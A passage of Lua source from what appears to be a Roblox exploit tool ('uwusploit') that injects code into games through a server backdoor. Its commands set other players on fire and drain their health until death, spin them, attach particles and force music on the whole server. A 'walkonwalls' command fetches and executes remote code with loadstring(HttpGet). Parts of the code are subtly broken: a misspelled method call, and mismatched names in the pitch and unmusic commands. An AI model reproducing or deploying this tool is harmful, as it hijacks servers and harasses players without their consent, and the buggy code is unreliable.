	elseif target == "all" then
		bckd = [[
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local character = player.Character
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    
                    if humanoid then
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                for _, existingFire in ipairs(part:GetChildren()) do
                                    if existingFire:IsA("Fire") then
                                        existingFire:Destroy()
                                    end
                                end
                            end
                        end
                        
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                local fire = Instance.new("Fire")
                                fire.Size = 10
                                fire.Heat = 1
                                fire.Color = fyecol
                                fire.SecondaryColor = secfyecol
                                fire.Parent = part
                            end
                        end
                        
                        task.spawn(function()
                            while humanoid and humanoid.Health > 0 and character.Parent do
                                humanoid.Health = humanoid.Health - 20
                                task.wait(0.5)
                            end
                        end)
                    end
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    task.wait(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], target)
	end

	if bckd ~= "" then
		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("dynamic9007", "dyn9007", function()
	local emotionController = {}

	local emotions = {
		angry = "rbxassetid://114905525024059",
		neutral = "rbxassetid://16116369076",
		blink = "rbxassetid://140719110059829"
	}

	local speaktxt = {
		angry = "rbxassetid://120009922945165",
		neutral = "rbxassetid://124616696573508",
		blink = "rbxassetid://110245971364225"
	}

	local currentEmotion = "angry"
	local isResting = false
	local isBlinking = true
	local isSpeaking = false
	local running = true
	local backdoorMode = false
	local pointLight = nil
	local localAccessory = nil
	local blinkThread = nil
	local speakThread = nil

	local function fullCleanup()
		running = false

		if blinkThread then
			coroutine.close(blinkThread)
			blinkThread = nil
		end

		if speakThread then
			coroutine.close(speakThread)
			speakThread = nil
		end

		if pointLight then
			pointLight:Destroy()
			pointLight = nil
		end
	end

	local function runEmotionSystem()
		fullCleanup()
		running = true
		backdoorMode = false

		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		local function setupAccessory(char)
			for _, accessory in ipairs(char:GetChildren()) do
				if accessory:IsA("Accessory") and 
					(accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						if not handle:FindFirstChild("EmotionLight") then
							pointLight = Instance.new("PointLight")
							pointLight.Name = "EmotionLight"
							pointLight.Brightness = 3
							pointLight.Range = 20
							pointLight.Color = Color3.fromHex("#3244ed")
							pointLight.Parent = handle
						end
						localAccessory = accessory
						return accessory
					end
				end
			end
			return nil
		end

		function emotionController.updateTexture(textureId)
			local accessory = setupAccessory(character)
			if not accessory then return end

			local handle = accessory:FindFirstChild("Handle")
			if not handle then return end

			local mesh = handle:FindFirstChildOfClass("SpecialMesh")
			if mesh then
				mesh.TextureId = textureId
			end

			if pointLight then
				pointLight.Color = Color3.fromHex("#3244ed")
			end
		end

		player.CharacterAdded:Connect(function(newChar)
			if not running then return end
			character = newChar
			pointLight = nil
			localAccessory = nil
			emotionController.updateTexture(emotions[currentEmotion])
		end)

		blinkThread = task.spawn(function()
			while running do
				if not isResting and isBlinking and not isSpeaking then
					local waitTime = math.random(3, 5)
					local startTime = os.clock()

					while os.clock() - startTime < waitTime and running do
						task.wait(0.1)
					end

					if running then
						emotionController.updateTexture(emotions["blink"])
						task.wait(0.1)
						emotionController.updateTexture(emotions[currentEmotion])
					end
				else
					task.wait(0.1)
				end
			end
		end)

		speakThread = task.spawn(function()
			while running do
				if isSpeaking then
					local emotion = isResting and "blink" or currentEmotion
					if speaktxt[emotion] then
						emotionController.updateTexture(speaktxt[emotion])
						task.wait(0.1)
						emotionController.updateTexture(emotions[emotion])
						task.wait(0.1)
					end
				else
					task.wait(0.1)
				end
			end
		end)

		emotionController.updateTexture(emotions[currentEmotion])
	end

	local function runBackdoorVersion()
		fullCleanup()
		backdoorMode = true
		currentEmotion = "angry"

		local scriptToRun = [[
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local emotions = {
        	angry = "rbxassetid://114905525024059",
        	neutral = "rbxassetid://16116369076",
        	blink = "rbxassetid://140719110059829"
        }

        local speaktxt = {
        	angry = "rbxassetid://120009922945165",
        	neutral = "rbxassetid://124616696573508",
        	blink = "rbxassetid://110245971364225"
        }
        
        local currentEmotion = "angry"
        local isResting = false
        local isBlinking = true
        local isSpeaking = false
        local running = true
        
        local activeLights = {}
        local characterConnections = {}
        
        local function applyToCharacter(character)
            for _, accessory in ipairs(character:GetChildren()) do
                if accessory:IsA("Accessory") and 
                   (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                    local handle = accessory:FindFirstChild("Handle")
                    if handle then
                        local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                        if mesh then
                            mesh.TextureId = emotions[currentEmotion]
                        end
                        
                        if not activeLights[handle] then
                            local light = Instance.new("PointLight")
                            light.Name = "EmotionLight"
                            light.Brightness = 3
                            light.Range = 20
                            light.Color = Color3.fromHex("#3244ed")
                            light.Parent = handle
                            activeLights[handle] = light
                            
                            handle.AncestryChanged:Connect(function(_, parent)
                                if not parent then
                                    if activeLights[handle] then
                                        activeLights[handle]:Destroy()
                                        activeLights[handle] = nil
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end
        
        for _, player in pairs(Players:GetPlayers()) do
            characterConnections[player] = player.CharacterAdded:Connect(function(character)
                if running then
                    applyToCharacter(character)
                end
            end)
            
            if player.Character then
                applyToCharacter(player.Character)
            end
        end
        
        local function updateAll(textureId)
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    for _, accessory in ipairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") and 
                           (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                                if mesh then
                                    mesh.TextureId = textureId
                                end
                                
                                if activeLights[handle] then
                                    activeLights[handle].Color = Color3.fromHex("#3244ed")
                                end
                            end
                        end
                    end
                end
            end
        end
        
        local blinkCoroutine = coroutine.create(function()
            while running do
                if not isResting and isBlinking and not isSpeaking then
                    local waitTime = math.random(3, 5)
                    local startTime = os.clock()
                    
                    while os.clock() - startTime < waitTime and running do
                        RunService.Heartbeat:Wait()
                    end
                    
                    if running then
                        updateAll(emotions["blink"])
                        task.wait(0.1)
                        updateAll(emotions[currentEmotion])
                    end
                else
                    task.wait(0.1)
                end
            end
        end)
        
        local speakCoroutine = coroutine.create(function()
            while running do
                if isSpeaking then
                    local emotion = isResting and "blink" or currentEmotion
                    if speaktxt[emotion] then
                        updateAll(speaktxt[emotion])
                        task.wait(0.1)
                        updateAll(emotions[emotion])
                        task.wait(0.1)
                    end
                else
                    task.wait(0.1)
                end
            end
        end)
        
        coroutine.resume(blinkCoroutine)
        coroutine.resume(speakCoroutine)
        
        return function()
            running = false
            if blinkCoroutine then
                coroutine.close(blinkCoroutine)
            end
            if speakCoroutine then
                coroutine.close(speakCoroutine)
            end
            for player, connection in pairs(characterConnections) do
                connection:Disconnect()
            end
            for handle, light in pairs(activeLights) do
                if light then
                    light:Destroy()
                end
            end
            activeLights = {}
            characterConnections = {}
        end
    ]]

		local cleanupFunc = runbackdoor(backdoor, scriptToRun)

		emotionController.cleanupBackdoor = cleanupFunc
	end

	if backdoor then
		runBackdoorVersion()
	else
		runEmotionSystem()
	end

	if not backdoorMode then
		local backdoorConnection
		backdoorConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if backdoor and not backdoorMode then
				backdoorConnection:Disconnect()
				runBackdoorVersion()
			end
		end)
	end

	return emotionController
end)

--------------------------------------------------------------------------------------------------------------

antifling = nil

addcommand("antifling", "afling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
	antifling = box["run service"].Heartbeat:Connect(function()
		for _, player in pairs(box["players"]:GetPlayers()) do
			if player ~= box["local player"] and player.Character then
				for _, v in pairs(player.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
			end
		end
	end)
end)

addcommand("unantifling", "unafling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("walkonwalls", "wallwalk", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
end)

--------------------------------------------------------------------------------------------------------------

addcommand("particle", "particle", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function tortso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstChild("HumanoidRootPart")
	end

	local function addpcl(player)
		if player and player.Character then
			local torso = tortso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end

				local pe = Instance.new("ParticleEmitter")
				pe.Texture = "rbxassetid://" .. imageId
				pe.VelocitySpread = 0
				pe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local se = Instance.new("ParticleEmitter")
				se.Texture = "rbxassetid://" .. imageId
				se.VelocitySpread = 0
				se.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local fe = Instance.new("ParticleEmitter")
				fe.Texture = "rbxassetid://" .. imageId
				fe.VelocitySpread = 0
				fe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			addpcl(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				addpcl(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() addpcl(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() addpcl(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					addpcl(player)
					break
				end
			end
		end
	else
		local bckd

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end

                        local pe = Instance.new("ParticleEmitter")
                        pe.Texture = "rbxassetid://%d"
                        pe.VelocitySpread = 50
                        pe.Parent = torso

                        local se = Instance.new("ParticleEmitter")
                        se.Texture = "rbxassetid://%d"
                        se.VelocitySpread = 50
                        se.Parent = torso

                        local fe = Instance.new("ParticleEmitter")
                        fe.Texture = "rbxassetid://%d"
                        fe.VelocitySpread = 50
                        fe.Parent = torso
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				bckd = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                ]], randomPlayer.Name, imageId, imageId, imageId)
			end
		elseif target == "others" then
			bckd = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "all" then
			bckd = string.format([[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], imageId, imageId, imageId)
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end

                                local pe = Instance.new("ParticleEmitter")
                                pe.Texture = "rbxassetid://%d"
                                pe.VelocitySpread = 50
                                pe.Parent = torso

                                local se = Instance.new("ParticleEmitter")
                                se.Texture = "rbxassetid://%d"
                                se.VelocitySpread = 50
                                se.Parent = torso

                                local fe = Instance.new("ParticleEmitter")
                                fe.Texture = "rbxassetid://%d"
                                fe.VelocitySpread = 50
                                fe.Parent = torso
                            end
                        end
                    ]], player.Name, imageId, imageId, imageId)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unparticle", "unparticle", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function tortso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstFirstChild("HumanoidRootPart")
	end

	local function removpcl(player)
		if player and player.Character then
			local torso = tortso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			removpcl(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				removpcl(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() removpcl(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() removpcl(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removpcl(player)
					break
				end
			end
		end
	else
		local bckd

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				bckd = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			bckd = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

currentMusic = nil

addcommand("music", "music", function(soundId)
	if workspace:FindFirstChild("uwumusic") then
		workspace.uwumusic:Destroy()
	end

	local folderPath = "uwusploit"
	local subfolderPath = folderPath .. "/external music"

	-- Ensure folders exist
	if not isfolder(folderPath) then makefolder(folderPath) end
	if not isfolder(subfolderPath) then makefolder(subfolderPath) end

	local bckd = [[
		if not game:GetService("Workspace"):FindFirstChild("uwumusic") then
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://%soundId%"
			sound.Looped = true
			sound.Volume = 1
			sound.Parent = game.Workspace
			sound.Name = "uwumusic"
			sound:Play()
		end
	]]

	if not backdoor then
		local soundMap = {
			["198748194766299"] = {file = "migas.mp3", url = "https://pomf2.lain.la/f/1hqwely5.mp3"},
			["193462927464828"] = {file = "krug.mp3", url = "https://pomf2.lain.la/f/h6bv2p1n.mp3"},
			["957262475728274"] = {file = "dokidi.mp3", url = "https://pomf2.lain.la/f/m5idnnmt.mp3"},
			["1737483827468439"] = {file = "pressed.mp3", url = "https://pomf2.lain.la/f/e0hezuqo.mp3"},
			["183646282846472"] = {file = "headlock.mp3", url = "https://pomf2.lain.la/f/fxqsl6jo.mp3"},
			["18364627264728"] = {file = "tacaxe.mp3", url = "https://pomf2.lain.la/f/lqaxx025.mp3"},
			["1837471837748471"] = {file = "renichtinersperado.mp3", url = "https://pomf2.lain.la/f/e1edapxe.mp3"},
			["196634818253957"] = {file = "vanished.mp3", url = "https://pomf2.lain.la/f/cf4z5gwk.mp3"},
			["1129483289284747"] = {file = "headlockjersy.mp3", url = "https://pomf2.lain.la/f/97xouvpl.mp3"},
			["1846418173638182"] = {file = "nohands.mp3", url = "https://pomf2.lain.la/f/btacyzaa.mp3"},
			["1538163717465828"] = {file = "taco.mp3", url = "https://pomf2.lain.la/f/bjrbtx0.mp3"},
			["193747197374837164"] = {file = "basbas.mp3", url = "https://pomf2.lain.la/f/gvub4ow7.mp3"},
			["19374728438288577"] = {file = "climalindo.mp3", url = "https://pomf2.lain.la/f/2z9s751.mp3"},
			["194728274626264857"] = {file = "angelical.mp3", url = "https://pomf2.lain.la/f/n3ih2zia.mp3"},
			["3727154382186353"] = {file = "fragment.mp3", url = "https://pomf2.lain.la/f/8vrhzyia.mp3"},
			["18246618364758572"] = {file = "tabo.mp3", url = "https://pomf2.lain.la/f/68568y.mp3"},
			["1937462828462817367"] = {file = "elajoga.mp3", url = "https://pomf2.lain.la/f/63qpt243.mp3"},
			["194728264781726473"] = {file = "bailedecoq.mp3", url = "https://pomf2.lain.la/f/49twlnnj.mp3"},
			["19374822837282737"] = {file = "pianotiles.mp3", url = "https://pomf2.lain.la/f/kxqg58t.mp3"},
			["18462827466282645"] = {file = "automotivorally.mp3", url = "https://pomf2.lain.la/f/mllrnyln.mp3"},
			["19472625184582173"] = {file = "hunniddolla.mp3", url = "https://pomf2.lain.la/f/ow5a6ze4.mp3"},
			["18367181637284636"] = {file = "mexiloestranhojumpstyle.mp3", url = "https://files.catbox.moe/583ny0.mp3"},
			["18367264627385726"] = {file = "estrelahelix.mp3", url = "https://files.catbox.moe/bk1ail.mp3"},
			["184738292625371357"] = {file = "hypnosaes.mp3", url = "https://files.catbox.moe/v0htkf.mp3"},
			["400004444044044"] = {file = "wutiwant.mp3", url = "https://pomf2.lain.la/f/feuyk3nj.mp3"},
			["04440404404040440"] = {file = "reality.mp3", url = "https://files.catbox.moe/uzgc8x.mp3"},
			["18462937481827373"] = {file = "crowsong.mp3", url = "https://files.catbox.moe/63ixlc.mp3"},
			["21937418364728284"] = {file = "baddobad.mp3", url = "https://files.catbox.moe/4lxzy3.mp3"},
			["1947472828477282"] = {file = "voltar.mp3", url = "https://files.catbox.moe/obgcg4.mp3"},
			["1947282747182747"] = {file = "lbfunk.mp3", url = "https://files.catbox.moe/thoo1v.mp3"},
			["1636291836383658"] = {file = "onlyfans.mp3", url = "https://files.catbox.moe/e0skbl.mp3"},
			["193648262648483626"] = {file = "felicidade.mp3", url = "https://files.catbox.moe/j0y274.mp3"},
			["2847278264727"] = {file = "bloodpop.mp3", url = "https://files.catbox.moe/jhc0te.mp3"}
		}

		local soundInfo = soundMap[soundId]
		if soundInfo then
			task.spawn(function()
				unablenotify("wait a moment.")
				local fullPath = subfolderPath .. "/" .. soundInfo.file

				if not isfile(fullPath) then
					writefile(fullPath, game:HttpGet(soundInfo.url))
				end

				local s = Instance.new("Sound")
				s.Name = "uwumusic"
				s.Looped = true
				s.Volume = 1
				s.SoundId = getcustomasset(fullPath)
				s.Parent = workspace
				s:Play()
				currentMusic = s
			end)
		else
			local fallback = Instance.new("Sound")
			fallback.Name = "uwumusic"
			fallback.SoundId = "rbxassetid://" .. soundId
			fallback.Looped = true
			fallback.Volume = 1
			fallback.Parent = workspace
			fallback:Play()
			currentMusic = fallback
		end
	else
		bckd = bckd:gsub("%%soundId%%", soundId)
		runbackdoor(backdoor, bckd)
	end
end)

addcommand("volume", "volume", function(volume)
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwumusic")
        if sound then
            sound.Volume = %volume%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Volume = volume
			end
		end
	else
		bckd = bckd:gsub("%%volume%%", volume)

		runbackdoor(backdoor, bckd)
	end
end)

addcommand("pitch", "pitch", function(pitch)
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwmusic")
        if sound then
            sound.Pitch = %pitch%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Pitch = pitch
			end
		end
	else
		bckd = bckd:gsub("%%pitch%%", pitch)

		runbackdoor(backdoor, bckd)
	end
end)

addcommand("unmusic", "unmusic", function()
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwumusic")
        if sound then
            sound:Destroy()
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			spawn(function()
				local sound = game.Workspace:FindFirstChild("uwmusic")
				if sound then
					sound:Destroy()
				end
			end)
			if currentMusic then
				currentMusic:Destroy()
				currentMusic = nil
			end
		end
	else
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spin", "spin", function(target, number)
	number = tonumber(number) or 5
	local players = game:GetService("Players"):GetPlayers()

	local function speen(player, speed)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end

			local spin = Instance.new("BodyAngularVelocity")
			spin.Name = "Spinning"
			spin.Parent = character:WaitForChild("HumanoidRootPart")
			spin.MaxTorque = Vector3.new(0, math.huge, 0)
			spin.AngularVelocity = Vector3.new(0, speed, 0)
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			speen(localPlayer, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			speen(randomPlayer, number)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					speen(player, number)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				speen(player, number)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					speen(player, number)
					found = true
					break
				end
			end
			if not found then
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer and localPlayer.Character then
            local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                for _, v in pairs(humanoidRootPart:GetChildren()) do
                    if v.Name == "Spinning" then
                        v:Destroy()
                    end
                end
                local spin = Instance.new("BodyAngularVelocity")
                spin.Name = "Spinning"
                spin.Parent = humanoidRootPart
                spin.MaxTorque = Vector3.new(0, math.huge, 0)
                spin.AngularVelocity = Vector3.new(0, %d, 0)
            end
        end
    ]], game.Players.LocalPlayer.Name, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                    local spin = Instance.new("BodyAngularVelocity")
                    spin.Name = "Spinning"
                    spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                    spin.MaxTorque = Vector3.new(0, math.huge, 0)
                    spin.AngularVelocity = Vector3.new(0, %d, 0)
                end
            ]], randomPlayer.Name, number)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                        local spin = Instance.new("BodyAngularVelocity")
                        spin.Name = "Spinning"
                        spin.Parent = character:WaitForChild("HumanoidRootPart")
                        spin.MaxTorque = Vector3.new(0, math.huge, 0)
                        spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
